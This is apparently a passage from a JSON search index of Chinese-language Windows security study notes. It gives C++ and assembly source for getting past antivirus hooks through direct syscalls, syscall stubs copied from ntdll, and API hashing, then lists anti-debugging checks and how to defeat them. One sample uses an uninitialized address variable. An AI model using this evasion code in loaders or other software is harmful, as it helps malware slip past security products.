RtlInitUnicodeString(&fileName, (PCWSTR)L\"\\\\??\\\\c:\\\\temp\\\\test.txt\"); ZeroMemory(&osb, sizeof(IO_STATUS_BLOCK)); InitializeObjectAttributes(&oa, &fileName, OBJ_CASE_INSENSITIVE, NULL, NULL); SysNtCreateFile( &fileHandle, FILE_GENERIC_WRITE, &oa, &osb, 0, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE, FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0); return 0; }","title":"\u624b\u52a8\u5e95\u5c42syscall\u8c03\u7528NT*\u51fd\u6570\u7ed5hook"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/#ntdlldllhook","text":"\u8fd9\u4e2a\u65b9\u6cd5\u662f\u76f4\u63a5\u4ece\u78c1\u76d8\u8bfb\u53d6\u4e86 ntdll \u5e76\u590d\u5236\u4e86\u4e00\u4efd\u5230\u5185\u5b58\u4e2d\uff0c\u7136\u540e\u5728\u590d\u5236\u7684 ntdll \u4e2d\u5bfb\u627e\u51fd\u6570\u7684\u5b58\u6839\uff0c\u901a\u8fc7\u4fee\u6539\u51fd\u6570\u7684\u5b58\u6839\u5730\u5740\uff0c\u6765\u5b9e\u73b0\u51fd\u6570\u4e0d\u901a\u8fc7\u539f ntdll \u6765\u5b9e\u73b0\u8c03\u7528\u3002\u6740\u8f6fhook\u6211\u8fd9\u4efd\u590d\u5236\u7684 ntdll \u4e4b\u524d\uff0c\u5c31\u5df2\u7ecf\u5b8c\u6210\u4e86\u8c03\u7528\u3002 \u5b9e\u73b0\u8fc7\u7a0b 1.\u8bfb\u53d6C:\\windows\\system32\\ntdll.dll\u6587\u4ef6\uff0c\u53e6\u5b58\u5230\u5185\u5b58\u4e2d 2.\u4ece\u5185\u5b58\u4e2d\u8bfb\u53d6\u6307\u5b9a\u51fd\u6570\u7684.rdata\u548c.text\u90e8\u5206 3.\u627e\u5230\u6307\u5b9a\u51fd\u6570\u7684\u5b58\u6839\u5b58\u5165\u5185\u5b58\u4e2d 4.\u5c06\u6307\u5b9a\u51fd\u6570\u7684\u7cfb\u7edf\u8c03\u7528\u5b58\u6839\u6307\u5411\u65b0\u5efa\u7684\u5185\u5b58\u533a\u57df 5.\u8c03\u7528\u6307\u5b9a\u51fd\u6570\uff0c\u5b9e\u9645\u4e0a\u8c03\u7528\u7684\u662f\u590d\u5236\u51fa\u6765\u7684\u5185\u5b58\u533a\u57df\u7684\u7cfb\u7edf\u8c03\u7528\u5b58\u6839\uff0c\u901a\u8fc7\u5185\u5b58\u5b58\u6839\u518d\u53bb\u6267\u884c\u76f8\u5e94\u7684\u5e95\u5c42\u8c03\u7528\uff0c\u8ddfntdll\u5b58\u6839\u662f\u4e00\u6837\u7684\uff0c\u907f\u514d\u4e86\u5728\u5185\u5b58\u4e2d\u76f4\u63a5\u8c03\u7528ntdll\u5b58\u6839 #include <iostream> #include \"Windows.h\" #include \"winternl.h\" #pragma comment(lib, \"ntdll\") int const SYSCALL_STUB_SIZE = 23; using myNtCreateFile = NTSTATUS(NTAPI*)(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength); PVOID RVAtoRawOffset(DWORD_PTR RVA, PIMAGE_SECTION_HEADER section) { return (PVOID)(RVA - section->VirtualAddress + section->PointerToRawData); } BOOL GetSyscallStub(LPCSTR functionName, PIMAGE_EXPORT_DIRECTORY exportDirectory, LPVOID fileData, PIMAGE_SECTION_HEADER textSection, PIMAGE_SECTION_HEADER rdataSection, LPVOID syscallStub) { PDWORD addressOfNames = (PDWORD)RVAtoRawOffset((DWORD_PTR)fileData + *(&exportDirectory->AddressOfNames), rdataSection); PDWORD addressOfFunctions = (PDWORD)RVAtoRawOffset((DWORD_PTR)fileData + *(&exportDirectory->AddressOfFunctions), rdataSection); BOOL stubFound = FALSE; for (size_t i = 0; i < exportDirectory->NumberOfNames; i++) { DWORD_PTR functionNameVA = (DWORD_PTR)RVAtoRawOffset((DWORD_PTR)fileData + addressOfNames[i], rdataSection); DWORD_PTR functionVA = (DWORD_PTR)RVAtoRawOffset((DWORD_PTR)fileData + addressOfFunctions[i + 1], textSection); LPCSTR functionNameResolved = (LPCSTR)functionNameVA; if (std::strcmp(functionNameResolved, functionName) == 0) { std::memcpy(syscallStub, (LPVOID)functionVA, SYSCALL_STUB_SIZE); stubFound = TRUE; } } return stubFound; } int main(int argc, char* argv[]) { char syscallStub[SYSCALL_STUB_SIZE] = {}; SIZE_T bytesWritten = 0; DWORD oldProtection = 0; HANDLE file = NULL; DWORD fileSize = NULL; DWORD bytesRead = NULL; LPVOID fileData = NULL; // variables for NtCreateFile OBJECT_ATTRIBUTES oa; HANDLE fileHandle = NULL; NTSTATUS status = NULL; UNICODE_STRING fileName; RtlInitUnicodeString(&fileName, (PCWSTR)L\"\\\\??\\\\c:\\\\temp\\\\pwn.log\"); IO_STATUS_BLOCK osb; ZeroMemory(&osb, sizeof(IO_STATUS_BLOCK)); InitializeObjectAttributes(&oa, &fileName, OBJ_CASE_INSENSITIVE, NULL, NULL); // define NtCreateFile myNtCreateFile NtCreateFile = (myNtCreateFile)(LPVOID)syscallStub; VirtualProtect(syscallStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection); file = CreateFileA(\"c:\\\\windows\\\\system32\\\\ntdll.dll\", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); fileSize = GetFileSize(file, NULL); fileData = HeapAlloc(GetProcessHeap(), 0, fileSize); ReadFile(file, fileData, fileSize, &bytesRead, NULL); PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileData; PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)fileData + dosHeader->e_lfanew); DWORD exportDirRVA = imageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress; PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(imageNTHeaders); PIMAGE_SECTION_HEADER textSection = section; PIMAGE_SECTION_HEADER rdataSection = section; for (int i = 0; i < imageNTHeaders->FileHeader.NumberOfSections; i++) { if (std::strcmp((CHAR*)section->Name, (CHAR*)\".rdata\") == 0) { rdataSection = section; break; } section++; } PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)RVAtoRawOffset((DWORD_PTR)fileData + exportDirRVA, rdataSection); GetSyscallStub(\"NtCreateFile\", exportDirectory, fileData, textSection, rdataSection, syscallStub); NtCreateFile(&fileHandle, FILE_GENERIC_WRITE, &oa, &osb, 0, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE, FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0); return 0; }","title":"\u4ecentdll.dll\u6587\u4ef6\u8bfb\u53d6\u51fd\u6570\u5b58\u6839\u7ed5hook"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/#syscall-apihash","text":"#include <Windows.h> #include <stdio.h> #include <Rpc.h> #include <winternl.h> #include <Ip2string.h> #pragma comment(lib, \"ntdll\") #define NtCurrentProcess() ((HANDLE)-1) #pragma comment(lib, \"Rpcrt4.lib\") #ifndef NT_SUCCESS #define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0) #endif #define UP -32 #define DOWN 32 EXTERN_C VOID GetSyscall(WORD systemCall); EXTERN_C NTSTATUS sysZwAllocateVirtualMemory( HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect ); EXTERN_C NTSTATUS sysNtProtectVirtualMemory( IN HANDLE ProcessHandle, IN OUT PVOID* BaseAddress, IN OUT PSIZE_T RegionSize, IN ULONG NewProtect, OUT PULONG OldProtect); EXTERN_C NTSTATUS sysNtCreateThreadEx( OUT PHANDLE hThread, IN ACCESS_MASK DesiredAccess, IN PVOID ObjectAttributes, IN HANDLE ProcessHandle, IN PVOID lpStartAddress, IN PVOID lpParameter, IN ULONG Flags, IN SIZE_T StackZeroBits, IN SIZE_T SizeOfStackCommit, IN SIZE_T SizeOfStackReserve, OUT PVOID lpBytesBuffer ); EXTERN_C NTSTATUS sysNtWaitForSingleObject( IN HANDLE Handle, IN BOOLEAN Alertable, IN PLARGE_INTEGER Timeout ); struct LDR_MODULE { LIST_ENTRY e[3]; HMODULE base; void* entry; UINT size; UNICODE_STRING dllPath; UNICODE_STRING dllname; }; EXTERN_C VOID GetSyscall(WORD systemCall); EXTERN_C VOID GetSyscallAddr(INT_PTR syscallAdr); EXTERN_C NTSTATUS sysNtCreateFile( PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength ); DWORD calcHash(char* data) { DWORD hash = 0x99; for (int i = 0; i < strlen(data); i++) { hash += data[i] + (hash << 1); } return hash; } static DWORD calcHashModule(LDR_MODULE* mdll) { char name[64]; size_t i = 0; while (mdll->dllname.Buffer[i] && i < sizeof(name) - 1) { name[i] = (char)mdll->dllname.Buffer[i]; i++; } name[i] = 0; return calcHash((char*)CharLowerA(name)); } static HMODULE getModule(DWORD myHash) { HMODULE module; INT_PTR peb = __readgsqword(0x60); auto ldr = 0x18; auto flink = 0x10; auto Mldr = *(INT_PTR*)(peb + ldr); auto M1flink = *(INT_PTR*)(Mldr + flink); auto Mdl = (LDR_MODULE*)M1flink; do { Mdl = (LDR_MODULE*)Mdl->e[0].Flink; if (Mdl->base != NULL) { if (calcHashModule(Mdl) == myHash) { break; } } } while (M1flink != (INT_PTR)Mdl); module = (HMODULE)Mdl->base; return module; } static LPVOID getAPIAddr(HMODULE module, DWORD myHash) { PIMAGE_DOS_HEADER DOSheader = (PIMAGE_DOS_HEADER)module; PIMAGE_NT_HEADERS NTheader = (PIMAGE_NT_HEADERS)((LPBYTE)module + DOSheader->e_lfanew); PIMAGE_EXPORT_DIRECTORY EXdir = (PIMAGE_EXPORT_DIRECTORY)( (LPBYTE)module + NTheader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); PDWORD fAddr = (PDWORD)((LPBYTE)module + EXdir->AddressOfFunctions); PDWORD fNames = (PDWORD)((LPBYTE)module + EXdir->AddressOfNames); PWORD fOrdinals = (PWORD)((LPBYTE)module + EXdir->AddressOfNameOrdinals); for (DWORD i = 0; i < EXdir->AddressOfFunctions; i++) { LPSTR pFuncName = (LPSTR)((LPBYTE)module + fNames[i]); if (calcHash(pFuncName) == myHash) { return (LPVOID)((LPBYTE)module + fAddr[fOrdinals[i]]); } } return NULL; } WORD Unh00ksyscallNum(LPVOID addr) { WORD syscall = NULL; if (*((PBYTE)addr) == 0x4c && *((PBYTE)addr + 1) == 0x8b && *((PBYTE)addr + 2) == 0xd1 && *((PBYTE)addr + 3) == 0xb8 && *((PBYTE)addr + 6) == 0x00 && *((PBYTE)addr + 7) == 0x00) { BYTE high = *((PBYTE)addr + 5); BYTE low = *((PBYTE)addr + 4); syscall = (high << 8) | low; return syscall; } if (*((PBYTE)addr) == 0xe9 || *((PBYTE)addr + 3) == 0xe9 || *((PBYTE)addr + 8) == 0xe9 || *((PBYTE)addr + 10) == 0xe9 || *((PBYTE)addr + 12) == 0xe9) { for (WORD idx = 1; idx <= 500; idx++) { if (*((PBYTE)addr + idx * DOWN) == 0x4c && *((PBYTE)addr + 1 + idx * DOWN) == 0x8b && *((PBYTE)addr + 2 + idx * DOWN) == 0xd1 && *((PBYTE)addr + 3 + idx * DOWN) == 0xb8 && *((PBYTE)addr + 6 + idx * DOWN) == 0x00 && *((PBYTE)addr + 7 + idx * DOWN) == 0x00) { BYTE high = *((PBYTE)addr + 5 + idx * DOWN); BYTE low = *((PBYTE)addr + 4 + idx * DOWN); syscall = (high << 8) | low - idx; return syscall; } if (*((PBYTE)addr + idx * UP) == 0x4c && *((PBYTE)addr + 1 + idx * UP) == 0x8b && *((PBYTE)addr + 2 + idx * UP) == 0xd1 && *((PBYTE)addr + 3 + idx * UP) == 0xb8 && *((PBYTE)addr + 6 + idx * UP) == 0x00 && *((PBYTE)addr + 7 + idx * UP) == 0x00) { BYTE high = *((PBYTE)addr + 5 + idx * UP); BYTE low = *((PBYTE)addr + 4 + idx * UP); syscall = (high << 8) | low + idx; return syscall; } } } } INT_PTR Unh00ksyscallInstr(LPVOID addr) { WORD syscall = NULL; if (*((PBYTE)addr) == 0x4c && *((PBYTE)addr + 1) == 0x8b && *((PBYTE)addr + 2) == 0xd1 && *((PBYTE)addr + 3) == 0xb8 && *((PBYTE)addr + 6) == 0x00 && *((PBYTE)addr + 7) == 0x00) { return (INT_PTR)addr + 0x12; // syscall } if (*((PBYTE)addr) == 0xe9 || *((PBYTE)addr + 3) == 0xe9 || *((PBYTE)addr + 8) == 0xe9 || *((PBYTE)addr + 10) == 0xe9 || *((PBYTE)addr + 12) == 0xe9) { for (WORD idx = 1; idx <= 500; idx++) { if (*((PBYTE)addr + idx * DOWN) == 0x4c && *((PBYTE)addr + 1 + idx * DOWN) == 0x8b && *((PBYTE)addr + 2 + idx * DOWN) == 0xd1 && *((PBYTE)addr + 3 + idx * DOWN) == 0xb8 && *((PBYTE)addr + 6 + idx * DOWN) == 0x00 && *((PBYTE)addr + 7 + idx * DOWN) == 0x00) { return (INT_PTR)addr + 0x12; } if (*((PBYTE)addr + idx * UP) == 0x4c && *((PBYTE)addr + 1 + idx * UP) == 0x8b && *((PBYTE)addr + 2 + idx * UP) == 0xd1 && *((PBYTE)addr + 3 + idx * UP) == 0xb8 && *((PBYTE)addr + 6 + idx * UP) == 0x00 && *((PBYTE)addr + 7 + idx * UP) == 0x00) { return (INT_PTR)addr + 0x12; } } } } int main() { //FARPROC addr = GetProcAddress(LoadLibraryA(\"ntdll\"), \"NtCreateFile\"); //GetModuleHandle \u7528apihash\u83b7\u53d6ntdll.dll\u53e5\u67c4 HMODULE dllBase1 = getModule(0x3E8557); HMODULE dllBase2 = GetModuleHandleA(\"ntdll.dll\"); //GetProcAddress \u7528apihash\u83b7\u53d6ZwAllocateVirtualMemory\u51fd\u6570\u57fa\u5740 LPVOID addr1 = getAPIAddr(dllBase1, 0x112da6be2b35); LPVOID addr2 = GetProcAddress(dllBase2, \"ZwAllocateVirtualMemory\"); //\u83b7\u53d6ZwAllocateVirtualMemory\u51fd\u6570\u7684syscall\u7684\u7f16\u53f7\u548csyscall\u5730\u5740 LPVOID addr; WORD syscallNum = Unh00ksyscallNum(addr); INT_PTR syscallAddr = Unh00ksyscallInstr(addr); //syscall GetSyscall(syscallNum); GetSyscallAddr(syscallAddr); //syscall\u4e4b\u540e\u6b63\u5e38\u4f7f\u7528\u51fd\u6570\uff0c\u9700\u8981\u5728asm\u4e2d\u5b9e\u73b0syscall\u8fc7\u7a0b PVOID BaseAddress = NULL; SIZE_T dwSize = 0x2000; NTSTATUS status1 = sysZwAllocateVirtualMemory(NtCurrentProcess(), &BaseAddress, 0, &dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); if (!NT_SUCCESS(status1)) { return 0; } return 0; } .data systemCall WORD 000h syscallAddr QWORD 0h .code GetSyscall proc mov systemCall, cx ret GetSyscall endp GetSyscallAddr proc mov syscallAddr, rcx ret GetSyscallAddr endp sysZwAllocateVirtualMemory proc mov r10, rcx mov ax, systemCall jmp qword ptr syscallAddr ret sysZwAllocateVirtualMemory endp sysNtProtectVirtualMemory proc mov r10, rcx mov ax, systemCall jmp qword ptr syscallAddr ret sysNtProtectVirtualMemory endp sysNtCreateThreadEx proc mov r10, rcx mov ax, systemCall jmp qword ptr syscallAddr ret sysNtCreateThreadEx endp sysNtWaitForSingleObject proc mov r10, rcx mov ax, systemCall jmp qword ptr syscallAddr ret sysNtWaitForSingleObject endp end","title":"\u624b\u52a8syscall + ApiHash"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/","text":"\u53cd\u8c03\u8bd5\u4e0e\u53cd\u865a\u62df\u673a 2023-10-27 \u53cd\u8c03\u8bd5 https://anti-debug.checkpoint.com/ \u53cd\u8c03\u8bd5\u6807\u5fd7\u4f4d Win32 API IsDebuggerPresent \u51fd\u6570 kernel32!IsDebuggerPresent() \u786e\u5b9a\u5f53\u524d\u8fdb\u7a0b\u662f\u5426\u6b63\u5728\u7531\u7528\u6237\u6a21\u5f0f\u8c03\u8bd5\u5668\uff08\u4f8b\u5982 OllyDbg \u6216 x64dbg\uff09\u8fdb\u884c\u8c03\u8bd5\u3002 \u901a\u5e38\uff0c\u8be5\u51fd\u6570\u4ec5\u68c0\u67e5\u8fdb\u7a0b\u73af\u5883\u5757\uff08PEB\uff09\u7684 BeingDebugged \u6807\u5fd7\u3002 call IsDebuggerPresent test al, al jne being_debugged ... being_debugged: push 1 call ExitProcess if (IsDebuggerPresent()) ExitProcess(-1); \u53cd\u53cd\u8c03\u8bd5 \u5c06\u8fdb\u7a0b\u73af\u5883\u5757 (PEB) \u7684 BeingDebugged \u6807\u5fd7\u8bbe\u7f6e\u4e3a 0\u3002\u6709\u5173\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605 BeingDebugged \u6807\u5fd7\u7f13\u89e3\u3002 \u4f7f\u7528syscallhide\u63d2\u4ef6\u3002 CheckRemoteDebuggerPresent() \u51fd\u6570 kernel32!CheckRemoteDebuggerPresent() \u68c0\u67e5\u8c03\u8bd5\u5668\uff08\u5728\u540c\u4e00\u53f0\u673a\u5668\u4e0a\u7684\u4e0d\u540c\u8fdb\u7a0b\u4e2d\uff09\u662f\u5426\u9644\u52a0\u5230\u5f53\u524d\u8fdb\u7a0b\u3002 BOOL bDebuggerPresent; if (TRUE == CheckRemoteDebuggerPresent(GetCurrentProcess(), &bDebuggerPresent) && TRUE == bDebuggerPresent) ExitProcess(-1); x86-64 lea rdx, [bDebuggerPresent] mov rcx, -1 ; GetCurrentProcess() call CheckRemoteDebuggerPresent cmp [bDebuggerPresent], 1 jz being_debugged ... being_debugged: mov ecx, -1 call ExitProcess \u53cd\u53cd\u8c03\u8bd5 \u5f53 CheckRemoteDebuggerPresent() \u8c03\u7528 NtQueryInformationProcess() \u65f6\uff0c\u552f\u4e00\u7684\u65b9\u6cd5\u662fhook NtQueryInformationProcess() \u5e76\u5728\u8fd4\u56de\u7f13\u51b2\u533a\u4e2d\u8bbe\u7f6e\u4ee5\u4e0b\u503c\uff1a - \u5982\u679c\u662f ProcessDebugPort \u67e5\u8be2\uff0c\u5219\u4e3a 0\uff08\u6216\u9664 -1 \u4e4b\u5916\u7684\u4efb\u4f55\u503c\uff09 - ProcessDebugFlags \u67e5\u8be2\u65f6\u4e3a\u975e\u96f6\u503c\u3002 - \u5982\u679c\u662f ProcessDebugObjectHandle \u67e5\u8be2\uff0c\u5219\u4e3a 0\u3002 NtQueryInformationProcess \u51fd\u6570 ntdll!NtQueryInformationProcess() \u53ef\u4ee5\u4ece\u8fdb\u7a0b\u4e2d\u68c0\u7d22\u4e0d\u540c\u7c7b\u578b\u7684\u4fe1\u606f\u3002 \u5b83\u63a5\u53d7 ProcessInformationClass \u53c2\u6570\uff0c\u8be5\u53c2\u6570\u6307\u5b9a\u60a8\u60f3\u8981\u83b7\u53d6\u7684\u4fe1\u606f\u5e76\u5b9a\u4e49 ProcessInformation \u53c2\u6570\u7684\u8f93\u51fa\u7c7b\u578b\u3002 \u7b2c\u4e00\u79cd\u68c0\u6d4b \u641c\u7d22 ProcessDebugPort \u7684\u503c\u662f\u5426\u4e3a 0xFFFFFFFF \uff0c\u5341\u8fdb\u5236 -1 x86-64 lea rcx, [dwReturned] push rcx ; ReturnLength mov r9d, 4 ; ProcessInformationLength lea r8, [dwProcessDebugPort] ; ProcessInformation mov edx, 7 ; ProcessInformationClass mov rcx, -1 ; ProcessHandle call NtQueryInformationProcess cmp dword ptr [dwProcessDebugPort], -1 jz being_debugged ... being_debugged: mov ecx, -1 call ExitProcess \u7b2c\u4e8c\u79cd\u68c0\u6d4b \u68c0\u6d4b ProcessDebugFlags \u7684\u503c\u662f\u5426\u4e3a 0x1f x86-64 lea rcx, [dwReturned] push rcx ; ReturnLength mov r9d, 4 ; ProcessInformationLength lea r8, [dwProcessDebugPort] ; ProcessInformation mov edx, 1Fh ; ProcessInformationClass mov rcx, -1 ; ProcessHandle call NtQueryInformationProcess cmp dword ptr [dwProcessDebugPort], 0 jz being_debugged ... being_debugged: mov ecx, -1 call ExitProcess \u7b2c\u4e09\u79cd\u68c0\u6d4b \u68c0\u6d4b ProcessDebugObjectHandle \u7684\u503c\u662f\u5426\u4e3a 0x1e x86-64 lea rcx, [dwReturned] push rcx ; ReturnLength mov r9d, 4 ; ProcessInformationLength lea r8, [hProcessDebugObject] ; ProcessInformation mov edx, 1Fh ; ProcessInformationClass mov rcx, -1 ; ProcessHandle call NtQueryInformationProcess cmp dword ptr [hProcessDebugObject], 0 jnz being_debugged ... being_debugged: mov ecx, -1 call ExitProcess \u53cd\u53cd\u8c03\u8bd5 \u540c\u4e0a RtlQueryProcessHeapInformation ntdll!RtlQueryProcessHeapInformation() \u51fd\u6570\u53ef\u7528\u4e8e\u4ece\u5f53\u524d\u8fdb\u7a0b\u7684\u8fdb\u7a0b\u5185\u5b58\u4e2d\u8bfb\u53d6\u5806\u6807\u5fd7\u3002 \u53cd\u53cd\u8c03\u8bd5 hook\u51fd\u6570\uff0c\u4fee\u6539\u8fd4\u56de\u503c - RTL_PROCESS_HEAPS::HeapInformation::Heaps[0]:: \u6807\u8bb0\u4e3a HEAP_GROWABLE RtlQueryProcessDebugInformation ntdll!RtlQueryProcessDebugInformation() \u51fd\u6570\u53ef\u7528\u4e8e\u4ece\u6240\u8bf7\u6c42\u8fdb\u7a0b\u7684\u8fdb\u7a0b\u5185\u5b58\u4e2d\u8bfb\u53d6\u67d0\u4e9b\u5b57\u6bb5\uff0c\u5305\u62ec\u5806\u6807\u5fd7\u3002 \u53cd\u53cd\u8c03\u8bd5 hook\u51fd\u6570\uff0c\u4fee\u6539\u8fd4\u56de\u503c - RTL_PROCESS_HEAPS::HeapInformation::Heaps[0]:: \u6807\u8bb0\u4e3a HEAP_GROWABLE NtQuerySystemInformation ntdll!NtQuerySystemInformation() \u51fd\u6570\u63a5\u53d7\u4e00\u4e2a\u53c2\u6570\uff0c\u8be5\u53c2\u6570\u662f\u8981\u67e5\u8be2\u7684\u4fe1\u606f\u7684\u7c7b\u522b\u3002 \u5927\u591a\u6570\u6559\u7a0b\u90fd\u6ca1\u6709\u8bb0\u5f55\u3002 \u8fd9\u5305\u62ec SystemKernelDebuggerInformation (0x23) \u7c7b\uff0c\u8be5\u7c7b\u81ea Windows NT \u4ee5\u6765\u5c31\u5df2\u5b58\u5728\u3002 SystemKernelDebuggerInformation \u7c7b\u8fd4\u56de\u4e24\u4e2a\u6807\u5fd7\u7684\u503c\uff1aal \u4e2d\u7684 KdDebuggerEnabled \u548c ah \u4e2d\u7684 KdDebuggerNotPresent\u3002 \u56e0\u6b64\uff0c\u5982\u679c\u5b58\u5728\u5185\u6838\u8c03\u8bd5\u5668\uff0cah \u4e2d\u7684\u8fd4\u56de\u503c\u4e3a\u96f6\u3002 \u53cd\u53cd\u8c03\u8bd5 hook\u51fd\u6570\uff0c\u4fee\u6539\u8fd4\u56de\u503c - SYSTEM_KERNEL_DEBUGGER_INFORMATION::DebuggerEnabled \u4e3a 0 \u4e14 SYSTEM_KERNEL_DEBUGGER_INFORMATION::DebuggerNotPresent \u4e3a 1 \u624b\u52a8\u53cd\u8c03\u8bd5 \u624b\u52a8\u53cd\u8c03\u8bd5\u662f\u5728\u4e0d\u9002\u7528API\u7684\u60c5\u51b5\u4e0b\u624b\u52a8\u4fee\u6539\u8c03\u8bd5\u6807\u5fd7 BeingDebugged Flag \u624b\u52a8\u4fee\u6539PEB\u7684 BeingDebugged x86-64 mov rax, gs:[60h] cmp byte ptr [rax+2], 0 jne being_debugged \u53cd\u53cd\u8c03\u8bd5 \u5c06 BeingDebugged \u6807\u5fd7\u8bbe\u7f6e\u4e3a 0 NtGlobal Flag \u8fdb\u7a0b\u73af\u5883\u5757\u7684 NtGlobalFlag \u5b57\u6bb5\uff0832 \u4f4d Windows \u4e0a\u7684\u504f\u79fb\u91cf\u4e3a 0x68\uff0c64 \u4f4d Windows \u4e0a\u7684\u504f\u79fb\u91cf\u4e3a 0xBC\uff09\u9ed8\u8ba4\u4e3a 0\u3002 \u8fde\u63a5\u8c03\u8bd5\u5668\u4e0d\u4f1a\u66f4\u6539 NtGlobalFlag \u7684\u503c\u3002 \u4f46\u662f\uff0c\u5982\u679c\u8fdb\u7a0b\u662f\u7531\u8c03\u8bd5\u5668\u521b\u5efa\u7684\uff0c\u5219\u4f1a\u8bbe\u7f6e\u4ee5\u4e0b\u6807\u5fd7\uff1a - FLG_HEAP_ENABLE_TAIL_CHECK (0x10) - FLG_HEAP_ENABLE_FREE_CHECK (0x20) - FLG_HEAP_VALIDATE_PARAMETERS (0x40) \u53ef\u4ee5\u901a\u8fc7\u68c0\u67e5\u8fd9\u4e9b\u6807\u5fd7\u7684\u7ec4\u5408\u6765\u68c0\u6d4b\u8c03\u8bd5\u5668\u7684\u5b58\u5728\u3002 mov rax, gs:[60h] mov al, [rax+BCh] and al, 70h cmp al, 70h jz being_debugged \u53cd\u53cd\u8c03\u8bd5 Set the NtGlobalFlag to 0 Heap Flag \u5806\u5305\u542b\u4e24\u4e2a\u53d7\u8c03\u8bd5\u5668\u5f71\u54cd\u7684\u5b57\u6bb5\u3002 \u5b83\u4eec\u5177\u4f53\u53d7\u5230\u7684\u5f71\u54cd\u53d6\u51b3\u4e8e Windows \u7248\u672c\u3002 \u8fd9\u4e9b\u5b57\u6bb5\u662f Flags \u548c ForceFlags\u3002 Flags \u548c ForceFlags \u7684\u503c\u901a\u5e38\u5206\u522b\u8bbe\u7f6e\u4e3a HEAP_GROWABLE \u548c 0\u3002 \u5728 64 \u4f4d Windows XP \u548c Windows Vista \u53ca\u66f4\u9ad8\u7248\u672c\u4e0a\uff0c\u5982\u679c\u5b58\u5728\u8c03\u8bd5\u5668\uff0c\u5219 Flags \u5b57\u6bb5\u5c06\u8bbe\u7f6e\u4e3a\u4ee5\u4e0b\u6807\u5fd7\u7684\u7ec4\u5408\uff1a - HEAP_GROWABLE (2) - HEAP_TAIL_CHECKING_ENABLED (0x20) - HEAP_FREE_CHECKING_ENABLED (0x40) - HEAP_VALIDATE_PARAMETERS_ENABLED (0x40000000) \u5f53\u5b58\u5728\u8c03\u8bd5\u5668\u65f6\uff0cForceFlags \u5b57\u6bb5\u8bbe\u7f6e\u4e3a\u4ee5\u4e0b\u6807\u5fd7\u7684\u7ec4\u5408\uff1a - HEAP_TAIL_CHECKING_ENABLED (0x20) - HEAP_FREE_CHECKING_ENABLED (0x40) - HEAP_VALIDATE_PARAMETERS_ENABLED (0x40000000) \u53cd\u53cd\u8c03\u8bd5 Set the Flags value to HEAP_GROWABLE, and the ForceFlags value to 0 Heap Protection \u5982\u679c\u5728 NtGlobalFlag \u4e2d\u8bbe\u7f6e\u4e86 HEAP_TAIL_CHECKING_ENABLED \u6807\u5fd7\uff0c\u5219\u5e8f\u5217 0xABABABAB \u5c06\u9644\u52a0\u5728\u5206\u914d\u7684\u5806\u5757\u7684\u672b\u5c3e\uff08\u5728 32 \u4f4d Windows \u4e2d2\u6b21\uff0c\u5728 64 \u4f4d Windows \u4e2d\u9644\u52a0 4 \u6b21\uff09\u3002 \u5982\u679c\u5728 NtGlobalFlag \u4e2d\u8bbe\u7f6e\u4e86 HEAP_FREE_CHECKING_ENABLED \u6807\u5fd7\uff0c\u5219\u5982\u679c\u9700\u8981\u989d\u5916\u7684\u5b57\u8282\u6765\u586b\u5145\u76f4\u5230\u4e0b\u4e00\u4e2a\u5185\u5b58\u5757\u7684\u7a7a\u767d\u7a7a\u95f4\uff0c\u5219\u4f1a\u9644\u52a0\u5e8f\u5217 0xFEEEFEEE \u3002 \u53cd\u53cd\u8c03\u8bd5 \u5728\u5806\u540e\u624b\u52a8\u4fee\u8865 32 \u4f4d\u73af\u5883\u4e2d\u7684 12 \u4e2a\u5b57\u8282\u548c 64 \u4f4d\u73af\u5883\u4e2d\u7684 20 \u4e2a\u5b57\u8282\u3002 \u6302\u94a9 kernel32!HeapAlloc() \u5e76\u5728\u5206\u914d\u540e\u4fee\u8865\u5806\u3002 Check KUSER_SHARED_DATA structure \u8fd9\u662f\u9488\u5bf9 TitanHide \u8c03\u8bd5\u5668\u7684\u6f0f\u6d1e \u7ed3\u8bba \u57fa\u4e8e\u6807\u5fd7\u4f4d\u7684\u53cd\u8c03\u8bd5\u6280\u672f\u9664\u4e86 Heap Protection ,\u5176\u4ed6\u90fd\u53ef\u4ee5\u7528 syscallhide \u63d2\u4ef6\u89e3\u51b3 \u5bf9\u8c61\u53e5\u67c4 